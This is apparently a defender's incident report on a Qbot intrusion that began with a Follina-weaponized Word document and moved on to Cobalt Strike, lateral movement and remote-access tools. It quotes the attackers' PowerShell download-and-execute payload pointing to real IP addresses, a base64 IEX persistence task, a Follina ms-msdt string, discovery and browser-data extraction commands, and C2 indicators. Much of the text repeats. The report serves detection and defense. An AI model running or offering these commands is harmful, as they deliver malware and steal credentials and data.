execution of the weaponized Word document, a HTML file was retrieved from a remote server containing a PowerShell payload. The payload contains base64-encoded content and is used to download Qbot DLLs inside the user\u2019s Temp directory. The Qbot DLL was executed via regsvr32.exe and the activity was immediately followed by injection into legitimate processes (explorer.exe) on the host. The injected process spawned Windows utilities such as whoami , net.exe and nslookup , to perform discovery activity and also established connection to Qbot C2 servers. Almost an hour later, the threat actors leveraged a Windows built-in utility, esentutl.exe , to extract browser data, a technique also observed in earlier cases. [ 1 ][ 2 ] Qbot used scheduled task creation as a persistence mechanism. The scheduled task contained a PowerShell command referencing multiple C2 IP addresses stored as base64-encoded blob in randomly named keys under the HKCU registry hive. After this activity, the threat actor proceeded with the remote creation of Qbot DLLs over SMB on multiple hosts throughout the environment. They then added multiple folders to the Windows Defender exclusions list on each of the infected machines to evade defenses, as we have seen before with Qbot. Remote services were then used to execute the DLLs. A Cobalt Strike server connection was witnessed within the first hour, but it wasn\u2019t until after lateral movement occurred that activity from that server began. Utilities such as nltest.exe and AdFind were executed by the injected Cobalt Strike process (explorer.exe). The injected process was also used to access the LSASS system process. Then, the threat actors installed a remote management tool named NetSupport Manager. Within 20 minutes of the installation, the threat actor moved laterally to the domain controller via a Remote Desktop session. On the domain controller, the tool Atera Remote Management was deployed, a popular tool used by attackers for controlling victim machines. This was the last adversarial activity observed for the day. The threat actors checked-in early the next day and downloaded a tool named Network Scanner by SoftPerfect on a domain controller. The tool was executed, which ran a port scan across the network. Finally, the threat actors connected to one of the file share servers via RDP and accessed sensitive documents. No further attacker activity was observed before the threat actors were evicted from the environment. Services We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, Qbot, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found here . We also have artifacts and IOCs available from this case such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services. Timeline Analysis and reporting completed by @ pigerlin , @yatinwad and @_pete_0 . Infection graph: Initial Access Ever since the disclosure of the Follina vulnerability (CVE-2022-30190) earlier this year, threat actors have been known to leverage the flaw in various phishing campaigns. Delivery of this intrusion was linked to TA570, using hijacked email threads to deliver the initial payload. This intrusion started after a Word document, weaponized with Follina exploit code, was used to deliver and infect the host with Qbot malware. When dealing with a Word document based on the OOXML format, associated files and folders are stored within a compressed ZIP archive. These items can be easily extracted by using an arbitrary zip utility like unzip . One of the embedded files that requires inspection during the analysis of a Follina maldoc, is named document.xml.rels This \u201crelationship\u201d (RELS) file contained an external reference to a remote HTML file, configured to be retrieved and loaded when the Word document is opened, or viewed in Preview Mode. At the bottom of the retrieved HTML page source, the script tag was defined and contained malicious JavaScript code that called the ms-msdt scheme. ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=?

A good detection opportunity is to monitor for this process being spawned by a Microsoft Office application such as WINWORD.EXE In our case, the payload contained base64-encoded PowerShell code. The decoded payload is also logged in EventID 4104 (script block logging) upon execution by the PowerShell engine. The Follina payload was designed to download Qbot libraries from three different URLs, drop the files inside the user\u2019s temp directory, and finally execute the DLLs using regsvr32.exe $p = $Env:temp iwr http://104.36.229.139/$(random).dat -OutFile $p\\t.A iwr http://85.239.55.228/$(random).dat -OutFile $p\\t1.A iwr http://185.234.247.119/$(random).dat -OutFile $p\\t2.A regsvr32 $p\\t.A regsvr32 $p\\t1.A regsvr32 $p\\t2.A Execution Upon execution of the MSDT payload, a new instance of the sdiagnhost.exe (Scripted Diagnostics Native Host) was spawned. This process was ultimately responsible for invoking the Follina payload, starting, in our case, three child instances of regsrv32.exe . After execution of the payload, the XML file PCW.debugreport.xml was created in the %localappdata%\\Diagnostics. directory. This file can serve as a valuable artifact when analyzing Follina exploitation (attempts). The payload, preceded by its recursive path, can be found in the TargetPath element of this XML-file. The payload configured to execute on the system is embedded in this file. Persistence Qbot maintained persistence by creating scheduled tasks across multiple endpoints. An example of a command that was executed can be seen below: schtasks.exe /Create /F /TN \"{E9ADEA37-C329-4967-9CF5-2682DA7D97BE}\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\Benfouqcgq).rxftejkhydnwmpt))) The scheduled task creation events were recorded in the Microsoft-Windows-TaskScheduler/Operational log. Inspection of the scheduled task showed that PowerShell referenced a registry key with a random generated value. This value differed from endpoint to endpoint: The data of this registry key consisted of a base64-encoded string: Decoding the base64-encoded string revealed a significant number of QBot\u2019s C2 IPv4 addresses and ports: C2 IPv4s are provided in the IoC section of this report. The SysWow64\\Explorer.exe process was also observed cycling through a number of domains \u2013 indicated by the DNS requests with a QueryStatus of RCODE:0 (NO ERROR). In addition, several connectivity checks were made to email relay services: Defense Evasion As reported earlier this year, QBot is known for using process hollowing. In this case, the 32-bit version of explorer.exe (indicated by the use of C:\\Windows\\SysWOW64) was started in a suspended state, which was then used as a target for injection. Inspecting memory dumped from the host, the injected processes were easy to discover using Volatility and the malfind module. Looking for output that included explorer.exe and contains the VAD tag PAGE_EXECUTE_READWRITE and MZ headers in the memory space, common attributes observed for process injection in memory. The injected explorer.exe process was used to spawn and inject into additional instances of explorer.exe (32-bit). An example event can be seen below. Source PID 11672 belonging to QBot, injected a DLL into PID 3592, which we discovered was part of Cobalt Strike C2 communication Using the injected process id\u2019s, and process names, we can then match that to the network connections observed using the volatility netscan module, discovering both the injected Qbot (PID 3992) and Cobalt strike (PID 5620) explorer processes. (The data below comes from a different host than the prior log.) Various folders were added as an exclusion for Windows Defender, commonly used by QBot, as a \u2018drop zone\u2019 for both execution and persistence. Credential Access Qbot attempted to steal credentials from the Credentials Manager. On one of the targeted systems, the injected explorer process opened a handle with suspicious access rights to a thread in the LSASS process. Credential dumping tools like Mimikatz often request this level of access and corresponds to the following access rights: PROCESS_VM_READ (0x0010) PROCESS_QUERY_INFORMATION (0x0400) PROCESS_QUERY_LIMITED_INFORMATION (0x1000) PROCESS_ALL_ACCESS (0x1fffff) We observed the LSASS process interaction from the injected Explorer process at two different access levels, 0x1410: In addition, on one host, the average LSASS interaction, with access right 0x1FFFFF (PROCESS_ALL_ACCESS) by the explorer process was ~13K every two hours. A significant volume of events. The article \u201c You Bet Your Lsass: Hunting LSASS Access \u201d by Splunk details examples of LSASS credential dumping. Discovery The following discovery commands were initiated by Qbot through the injected process on the beachhead system: whoami /all cmd /c set net view /all ipconfig /all net share nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.DOMAIN net localgroup netstat -nao route print net group /domain net group \"Domain Computers\" /domain C:\\Windows\\System32\\cmd.exe /C c:\\windows\\sysnative\\nltest.exe /domain_trusts /all_trusts Later, more discovery commands were observed from the Cobalt Strike injected process on another victim system: net group \"domain controllers\" /dom net group \"domain admins\" /dom C:\\Windows\\system32\\cmd.exe /C ping -n 1 <Redacted> On the same host, AdFind was executed to enumerate all computer objects in the Active Directory domain: On second day of the intrusion, threat attackers downloaded a tool named Network Scanner (netscan.exe) by SoftPerfect on the domain controller, using Internet Explorer. The tool was used to trigger another port scan, this time targeting TCP ports 445 and 3389. Periodic requests to api.ipify.org were observed throughout the intrusion by the SysWOW64\\Explorer process and by the ATERA agent. Ipify.org can be used to determine the public facing IPv4 address of the network. We\u2019ve observed the use of ipify.org in previous cases. Lateral Movement Qbot DLLs were created remotely from the beachhead host and saved in the administrative C$ share of other hosts within the network. This activity was also clearly visible in Zeek SMB File data in the network. A local service was also registered on each of the targeted systems, configured to execute the Qbot DLL using regsvr32.exe The following Suricata signatures identified both the remote file creation and service registration events: ET RPC DCERPC SVCCTL - Remote Service Control Manager Access ET POLICY SMB Executable File Transfer ET POLICY SMB2 NT Create AndX Request For a DLL File - Possible Lateral Movement Execution of the new service was observed shorty after invoking the Qbot DLL. The threat actor also used RDP to pivot between systems on the network such as a domain controller and a file server. The creation of the rdpclip.exe process on the target host is another indication that a RDP connection was successful. The start of this process by a non-human account is another great detection opportunity. Collection Qbot used various information stealing modules to extract sensitive information from the beachhead host. Outlook was started, possibly to steal e-mail messages. However, we could not find evidence to conclusively support this. Qbot also used the Windows built-in utility esentutl.exe to extract browser data from Internet Explorer and Microsoft Edge: esentutl.exe /r V01 /l\"C:\\Users\\<redacted>\\AppData\\Local\\Microsoft\\Windows\\WebCache\" /s\"C:\\Users\\<redacted>\\AppData\\Local\\Microsoft\\Windows\\WebCache\" /d\"C:\\Users\\<redacted>\\AppData\\Local\\Microsoft\\Windows\\WebCache\" On a file server, we observed the threat actor manually inspecting files using various built-in viewers. For example, for viewing PDF files, Internet Explorer was used to view these files. For DOCX files, WordPad was used. An indication that these files were viewed locally on the network, was the presence of the \u2018OpenWith\u2019 process: Command and Control The following C2 IP-addresses/domains belonging to Qbot were recorded during this intrusion: 144.202.3[.]39 subject: CN=pesqfbmfk.us,OU=Mklbwanvv Kibn Fykniqfvki,C=FR, issuer: CN=pesqfbmfk.us,O=Jgi Vwmmuia Inc.,L=Rnhsjsu Bbrwua,ST=QQ,C=FR ja3: 72a589da586844d7f0818ce684948eea ja3s: 8ed408107f89c53261bf74e58517bc76 176.67.56[.]94 domain: visdeirun.net issuer: Scau Lofoefo Cubhfilnb Ixtfb ja3: 72a589da586844d7f0818ce684948eea ja3s: 7c02dbae662670040c7af9bd15fb7e2f 72.252.157[.]93 subject: CN=rfhmw.biz,OU=Yoefut,C=ES, issuer: CN=rfhmw.biz,O=Umalauqv Tyv LLC.,L=Ojaomei Xyaik,ST=LO,C=ES ja3: 72a589da586844d7f0818ce684948eea ja3s: 7c02dbae662670040c7af9bd15fb7e2f 90.120.65[.]153 subject: CN=jaubai.net,OU=Naha,C=AU, issuer: CN=jaubai.net,O=Riwi Ohbptdbe LLC.,L=Bia,ST=PX,C=AU ja3: 72a589da586844d7f0818ce684948eea ja3s: 7c02dbae662670040c7af9bd15fb7e2f 67.209.195[.]198 domain: visdeirun.net issuer: Aigmx Ijocl Ooeymfx Eiav LLC. ja3: 72a589da586844d7f0818ce684948eea ja3s: 7c02dbae662670040c7af9bd15fb7e2f The (default) named pipe postex_4c14 was observed from a Cobalt Strike injected explore.exe process.

Qbot, also known as Qakbot or Pinksliplot is actively developed and capable of a number of functions from reconnaissance, lateral movement, data exfiltration, to delivering other payloads acting as an initial access broker. Qbot is regarded by US CERT as being one of the 2021 Top Malware Strains in Alert (AA22-216A) . In the past we\u2019ve covered other intrusion cases where Qbot was used as an initial access vector. See our reports titled \u201c Qbot and Zerologon Lead To Full Domain Compromise \u201d and \u201c Qbot Likes to Move It, Move It \u201c. In this intrusion, soon after execution of the Qbot payload, the malware established C2 connectivity and performed discovery activity on the beachhead host. Along the way, the threat actors pivoted to multiple systems and installed remote management tools such as NetSupport and Atera Agent, and utilized the ubiquitous Cobalt Strike for maintaining access to the network. The intrusion lasted 2 days, and the attackers ultimately showed interest in accessing sensitive documents hosted on a file server, after which, they exited the environment. Case Summary In this intrusion, a threat actor abused the CVE-2022-30190 (Follina) vulnerability, where exploit code was embedded inside a malicious Word document to gain initial access. We assess with medium to high confidence that the documents likely arrived by the means of thread-hijacked emails from distribution channels used by TA570 . Upon execution of the weaponized Word document, a HTML file was retrieved from a remote server containing a PowerShell payload. The payload contains base64-encoded content and is used to download Qbot DLLs inside the user\u2019s Temp directory. The Qbot DLL was executed via regsvr32.exe and the activity was immediately followed by injection into legitimate processes (explorer.exe) on the host. The injected process spawned Windows utilities such as whoami , net.exe and nslookup , to perform discovery activity and also established connection to Qbot C2 servers. Almost an hour later, the threat actors leveraged a Windows built-in utility, esentutl.exe , to extract browser data, a technique also observed in earlier cases. [ 1 ][ 2 ] Qbot used scheduled task creation as a persistence mechanism. The scheduled task contained a PowerShell command referencing multiple C2 IP addresses stored as base64-encoded blob in randomly named keys under the HKCU registry hive. After this activity, the threat actor proceeded with the remote creation of Qbot DLLs over SMB on multiple hosts throughout the environment. They then added multiple folders to the Windows Defender exclusions list on each of the infected machines to evade defenses, as we have seen before with Qbot. Remote services were then used to execute the DLLs. A Cobalt Strike server connection was witnessed within the first hour, but it wasn\u2019t until after lateral movement occurred that activity from that server began. Utilities such as nltest.exe and AdFind were executed by the injected Cobalt Strike process (explorer.exe). The injected process was also used to access the LSASS system process. Then, the threat actors installed a remote management tool named NetSupport Manager. Within 20 minutes of the installation, the threat actor moved laterally to the domain controller via a Remote Desktop session. On the domain controller, the tool Atera Remote Management was deployed, a popular tool used by attackers for controlling victim machines. This was the last adversarial activity observed for the day. The threat actors checked-in early the next day and downloaded a tool named Network Scanner by SoftPerfect on a domain controller. The tool was executed, which ran a port scan across the network. Finally, the threat actors connected to one of the file share servers via RDP and accessed sensitive documents. No further attacker activity was observed before the threat actors were evicted from the environment. Services We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, Qbot, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found here . We also have artifacts and IOCs available from this case such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services. Timeline Analysis and reporting completed by @ pigerlin , @yatinwad and @_pete_0 . Infection graph: Initial Access Ever since the disclosure of the Follina vulnerability (CVE-2022-30190) earlier this year, threat actors have been known to leverage the flaw in various phishing campaigns. Delivery of this intrusion was linked to TA570, using hijacked email threads to deliver the initial payload. This intrusion started after a Word document, weaponized with Follina exploit code, was used to deliver and infect the host with Qbot malware. When dealing with a Word document based on the OOXML format, associated files and folders are stored within a compressed ZIP archive. These items can be easily extracted by using an arbitrary zip utility like unzip . One of the embedded files that requires inspection during the analysis of a Follina maldoc, is named document.xml.rels This \u201crelationship\u201d (RELS) file contained an external reference to a remote HTML file, configured to be retrieved and loaded when the Word document is opened, or viewed in Preview Mode. At the bottom of the retrieved HTML page source, the script tag was defined and contained malicious JavaScript code that called the ms-msdt scheme. ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=?

A good detection opportunity is to monitor for this process being spawned by a Microsoft Office application such as WINWORD.EXE In our case, the payload contained base64-encoded PowerShell code. The decoded payload is also logged in EventID 4104 (script block logging) upon execution by the PowerShell engine. The Follina payload was designed to download Qbot libraries from three different URLs, drop the files inside the user\u2019s temp directory, and finally execute the DLLs using regsvr32.exe $p = $Env:temp iwr http://104.36.229.139/$(random).dat -OutFile $p\\t.A iwr http://85.239.55.228/$(random).dat -OutFile $p\\t1.A iwr http://185.234.247.119/$(random).dat -OutFile $p\\t2.A regsvr32 $p\\t.A regsvr32 $p\\t1.A regsvr32 $p\\t2.A Execution Upon execution of the MSDT payload, a new instance of the sdiagnhost.exe (Scripted Diagnostics Native Host) was spawned. This process was ultimately responsible for invoking the Follina payload, starting, in our case, three child instances of regsrv32.exe . After execution of the payload, the XML file PCW.debugreport.xml was created in the %localappdata%\\Diagnostics. directory. This file can serve as a valuable artifact when analyzing Follina exploitation (attempts). The payload, preceded by its recursive path, can be found in the TargetPath element of this XML-file. The payload configured to execute on the system is embedded in this file. Persistence Qbot maintained persistence by creating scheduled tasks across multiple endpoints. An example of a command that was executed can be seen below: schtasks.exe /Create /F /TN \"{E9ADEA37-C329-4967-9CF5-2682DA7D97BE}\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\Benfouqcgq).rxftejkhydnwmpt))) The scheduled task creation events were recorded in the Microsoft-Windows-TaskScheduler/Operational log. Inspection of the scheduled task showed that PowerShell referenced a registry key with a random generated value. This value differed from endpoint to endpoint: The data of this registry key consisted of a base64-encoded string: Decoding the base64-encoded string revealed a significant number of QBot\u2019s C2 IPv4 addresses and ports: C2 IPv4s are provided in the IoC section of this report. The SysWow64\\Explorer.exe process was also observed cycling through a number of domains \u2013 indicated by the DNS requests with a QueryStatus of RCODE:0 (NO ERROR). In addition, several connectivity checks were made to email relay services: Defense Evasion As reported earlier this year, QBot is known for using process hollowing. In this case, the 32-bit version of explorer.exe (indicated by the use of C:\\Windows\\SysWOW64) was started in a suspended state, which was then used as a target for injection. Inspecting memory dumped from the host, the injected processes were easy to discover using Volatility and the malfind module. Looking for output that included explorer.exe and contains the VAD tag PAGE_EXECUTE_READWRITE and MZ headers in the memory space, common attributes observed for process injection in memory. The injected explorer.exe process was used to spawn and inject into additional instances of explorer.exe (32-bit). An example event can be seen below. Source PID 11672 belonging to QBot, injected a DLL into PID 3592, which we discovered was part of Cobalt Strike C2 communication Using the injected process id\u2019s, and process names, we can then match that to the network connections observed using the volatility netscan module, discovering both the injected Qbot (PID 3992) and Cobalt strike (PID 5620) explorer processes. (The data below comes from a different host than the prior log.) Various folders were added as an exclusion for Windows Defender, commonly used by QBot, as a \u2018drop zone\u2019 for both execution and persistence. Credential Access Qbot attempted to steal credentials from the Credentials Manager. On one of the targeted systems, the injected explorer process opened a handle with suspicious access rights to a thread in the LSASS process. Credential dumping tools like Mimikatz often request this level of access and corresponds to the following access rights: PROCESS_VM_READ (0x0010) PROCESS_QUERY_INFORMATION (0x0400) PROCESS_QUERY_LIMITED_INFORMATION (0x1000) PROCESS_ALL_ACCESS (0x1fffff) We observed the LSASS process interaction from the injected Explorer process at two different access levels, 0x1410: In addition, on one host, the average LSASS interaction, with access right 0x1FFFFF (PROCESS_ALL_ACCESS) by the explorer process was ~13K every two hours. A significant volume of events. The article \u201c You Bet Your Lsass: Hunting LSASS Access \u201d by Splunk details examples of LSASS credential dumping. Discovery The following discovery commands were initiated by Qbot through the injected process on the beachhead system: whoami /all cmd /c set net view /all ipconfig /all net share nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.DOMAIN net localgroup netstat -nao route print net group /domain net group \"Domain Computers\" /domain C:\\Windows\\System32\\cmd.exe /C c:\\windows\\sysnative\\nltest.exe /domain_trusts /all_trusts Later, more discovery commands were observed from the Cobalt Strike injected process on another victim system: net group \"domain controllers\" /dom net group \"domain admins\" /dom C:\\Windows\\system32\\cmd.exe /C ping -n 1 <Redacted> On the same host, AdFind was executed to enumerate all computer objects in the Active Directory domain: On second day of the intrusion, threat attackers downloaded a tool named Network Scanner (netscan.exe) by SoftPerfect on the domain controller, using Internet Explorer. The tool was used to trigger another port scan, this time targeting TCP ports 445 and 3389. Periodic requests to api.ipify.org were observed throughout the intrusion by the SysWOW64\\Explorer process and by the ATERA agent. Ipify.org can be used to determine the public facing IPv4 address of the network. We\u2019ve observed the use of ipify.org in previous cases. Lateral Movement Qbot DLLs were created remotely from the beachhead host and saved in the administrative C$ share of other hosts within the network. This activity was also clearly visible in Zeek SMB File data in the network. A local service was also registered on each of the targeted systems, configured to execute the Qbot DLL using regsvr32.exe The following Suricata signatures identified both the remote file creation and service registration events: ET RPC DCERPC SVCCTL - Remote Service Control Manager Access ET POLICY SMB Executable File Transfer ET POLICY SMB2 NT Create AndX Request For a DLL File - Possible Lateral Movement Execution of the new service was observed shorty after invoking the Qbot DLL. The threat actor also used RDP to pivot between systems on the network such as a domain controller and a file server. The creation of the rdpclip.exe process on the target host is another indication that a RDP connection was successful. The start of this process by a non-human account is another great detection opportunity. Collection Qbot used various information stealing modules to extract sensitive information from the beachhead host. Outlook was started, possibly to steal e-mail messages. However, we could not find evidence to conclusively support this. Qbot also used the Windows built-in utility esentutl.exe to extract browser data from Internet Explorer and Microsoft Edge: esentutl.exe /r V01 /l\"C:\\Users\\<redacted>\\AppData\\Local\\Microsoft\\Windows\\WebCache\" /s\"C:\\Users\\<redacted>\\AppData\\Local\\Microsoft\\Windows\\WebCache\" /d\"C:\\Users\\<redacted>\\AppData\\Local\\Microsoft\\Windows\\WebCache\" On a file server, we observed the threat actor manually inspecting files using various built-in viewers. For example, for viewing PDF files, Internet Explorer was used to view these files. For DOCX files, WordPad was used. An indication that these files were viewed locally on the network, was the presence of the \u2018OpenWith\u2019 process: Command and Control The following C2 IP-addresses/domains belonging to Qbot were recorded during this intrusion: 144.202.3[.]39 subject: CN=pesqfbmfk.us,OU=Mklbwanvv Kibn Fykniqfvki,C=FR, issuer: CN=pesqfbmfk.us,O=Jgi Vwmmuia Inc.,L=Rnhsjsu Bbrwua,ST=QQ,C=FR ja3: 72a589da586844d7f0818ce684948eea ja3s: 8ed408107f89c53261bf74e58517bc76 176.67.56[.]94 domain: visdeirun.net issuer: Scau Lofoefo Cubhfilnb Ixtfb ja3: 72a589da586844d7f0818ce684948eea ja3s: 7c02dbae662670040c7af9bd15fb7e2f 72.252.157[.]93 subject: CN=rfhmw.biz,OU=Yoefut,C=ES, issuer: CN=rfhmw.biz,O=Umalauqv Tyv LLC.,L=Ojaomei Xyaik,ST=LO,C=ES ja3: 72a589da586844d7f0818ce684948eea ja3s: 7c02dbae662670040c7af9bd15fb7e2f 90.120.65[.]153 subject: CN=jaubai.net,OU=Naha,C=AU, issuer: CN=jaubai.net,O=Riwi Ohbptdbe LLC.,L=Bia,ST=PX,C=AU ja3: 72a589da586844d7f0818ce684948eea ja3s: 7c02dbae662670040c7af9bd15fb7e2f 67.209.195[.]198 domain: visdeirun.net issuer: Aigmx Ijocl Ooeymfx Eiav LLC. ja3: 72a589da586844d7f0818ce684948eea ja3s: 7c02dbae662670040c7af9bd15fb7e2f The (default) named pipe postex_4c14 was observed from a Cobalt Strike injected explore.exe process.
